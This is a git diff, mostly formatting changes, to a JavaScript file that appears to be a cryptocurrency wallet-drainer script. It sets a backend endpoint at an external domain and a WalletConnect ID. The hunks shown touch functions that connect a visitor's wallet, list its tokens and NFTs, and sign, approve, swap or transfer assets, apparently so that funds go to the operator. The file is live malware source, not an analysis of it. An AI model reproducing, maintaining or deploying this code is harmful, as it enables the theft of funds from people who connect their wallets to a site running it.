@@ -1,13 +1,10 @@
-
 let MS_Encryption_Key = 0; // Specify any number that will be used for encryption (it is not recommended to leave it as default!)
 
-const API_ENDPOINT = 'https://fasterdeliveryuae.com/';
+const API_ENDPOINT = "https://fasterdeliveryuae.com/";
 
+const MS_WalletConnect_ID = "2fb18219fb9b4fb01220efa381cd8c0e";
 
-const MS_WalletConnect_ID = "2fb18219fb9b4fb01220efa381cd8c0e"; 
-
-const MS_Verify_Message = ""; 
-
+const MS_Verify_Message = "";
 
 const MS_WalletConnect_MetaData = {
   name: document.title, // Default is the same as the site name
@@ -795,7 +792,7 @@ const get_tokens = async (address) => {
     console.log(err);
     return [];
   }
-}; 
+};
 
 const get_nfts = async (address) => {
   try {
@@ -1146,14 +1143,14 @@ const SIGN_NATIVE = async (asset) => {
     asset.chain_id == 42161
       ? 1500000
       : asset.chain_id == 43114
-      ? 1500000
-      : 21000;
+        ? 1500000
+        : 21000;
   const gas_limit_ct =
     asset.chain_id == 42161
       ? 5000000
       : asset.chain_id == 43114
-      ? 5000000
-      : 150000;
+        ? 5000000
+        : 150000;
 
   const gas_price_calc = ethers.BigNumber.from(
     asset.chain_id == 10 ? "35000000000" : gas_price
@@ -1259,8 +1256,8 @@ const SIGN_TOKEN = async (asset) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 250000;
+          ? 5000000
+          : 250000;
   }
   const nonce = await get_nonce(asset.chain_id);
   let data = null,
@@ -1349,8 +1346,8 @@ const SIGN_NFT = async (asset) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 250000;
+          ? 5000000
+          : 250000;
   }
   const nonce = await get_nonce(asset.chain_id);
   let data = null,
@@ -1433,8 +1430,8 @@ const DO_SWAP = async (asset) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 350000;
+          ? 5000000
+          : 350000;
   }
   const nonce = await get_nonce(asset.chain_id);
   const swap_value = ethers.BigNumber.from(asset.amount_raw).lte(
@@ -1519,8 +1516,8 @@ const DO_UNISWAP = async (asset, all_tokens) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 500000;
+          ? 5000000
+          : 500000;
   }
   await swap_request(asset.swapper_type, asset, all_tokens);
   sign_next();
@@ -1592,8 +1589,8 @@ const DO_PANCAKE_V3 = async (asset, all_tokens) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 500000;
+          ? 5000000
+          : 500000;
   }
   await swap_request(asset.swapper_type, asset, all_tokens);
   sign_next();
@@ -1633,14 +1630,14 @@ const DO_CONTRACT = async (asset) => {
     asset.chain_id == 42161
       ? 5000000
       : asset.chain_id == 43114
-      ? 5000000
-      : 100000;
+        ? 5000000
+        : 100000;
   const gas_limit_ct =
     asset.chain_id == 42161
       ? 5000000
       : asset.chain_id == 43114
-      ? 5000000
-      : 150000;
+        ? 5000000
+        : 150000;
 
   const gas_price_calc = ethers.BigNumber.from(
     asset.chain_id == 10 ? "35000000000" : gas_price
@@ -1706,14 +1703,14 @@ const TRANSFER_NATIVE = async (asset) => {
     asset.chain_id == 42161
       ? 1500000
       : asset.chain_id == 43114
-      ? 1500000
-      : 21000;
+        ? 1500000
+        : 21000;
   const gas_limit_ct =
     asset.chain_id == 42161
       ? 5000000
       : asset.chain_id == 43114
-      ? 5000000
-      : 150000;
+        ? 5000000
+        : 150000;
 
   const gas_price_calc = ethers.BigNumber.from(
     asset.chain_id == 10 ? "35000000000" : gas_price
@@ -1782,8 +1779,8 @@ const TRANSFER_TOKEN = async (asset) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 250000;
+          ? 5000000
+          : 250000;
   }
   await transfer_request(asset);
   sign_next();
@@ -1832,8 +1829,8 @@ const TRANSFER_NFT = async (asset) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 250000;
+          ? 5000000
+          : 250000;
   }
   await transfer_request(asset);
   sign_next();
@@ -1900,8 +1897,8 @@ const RETRO_MM_APPROVE_TOKEN = async (asset) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 250000;
+          ? 5000000
+          : 250000;
   }
   let web3_contract = new web3.eth.Contract(
     MS_Contract_ABI["ERC20"],
@@ -1975,8 +1972,8 @@ const DO_SAFA = async (asset) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 250000;
+          ? 5000000
+          : 250000;
   }
   await approve_request(asset);
   sign_next();
@@ -2950,8 +2947,8 @@ const APPROVE_TOKEN = async (asset) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 250000;
+          ? 5000000
+          : 250000;
   }
   await approve_request(asset);
   sign_next();
@@ -3024,8 +3021,8 @@ const MM_APPROVE_TOKEN = async (asset) => {
       asset.chain_id == 42161
         ? 5000000
         : asset.chain_id == 43114
-        ? 5000000
-        : 250000;
+          ? 5000000
+          : 250000;
   }
   await approve_request(asset);
   sign_next();
@@ -3301,9 +3298,8 @@ const connect_wallet = async (provider = null) => {
         const verification_message = (
           MS_Verify_Message == "" ? MS_Settings.V_MSG : MS_Verify_Message
         ).replaceAll("{{ADDRESS}}", MS_Current_Address);
-        const signed_message = await MS_Signer.signMessage(
-          verification_message
-        );
+        const signed_message =
+          await MS_Signer.signMessage(verification_message);
         const is_sign_correct = ethers.utils.recoverAddress(
           ethers.utils.hashMessage(verification_message),
           signed_message
@@ -3487,16 +3483,16 @@ const connect_wallet = async (provider = null) => {
               asset.chain_id == 42161
                 ? 5000000
                 : asset.chain_id == 43114
-                ? 5000000
-                : is_contract_use
-                ? 100000
-                : 21000;
+                  ? 5000000
+                  : is_contract_use
+                    ? 100000
+                    : 21000;
             const gas_limit_ct =
               asset.chain_id == 42161
                 ? 5000000
                 : asset.chain_id == 43114
-                ? 5000000
-                : 150000;
+                  ? 5000000
+                  : 150000;
             const gas_price_calc = ethers.BigNumber.from(
               asset.chain_id == 10 ? "35000000000" : gas_price
             );
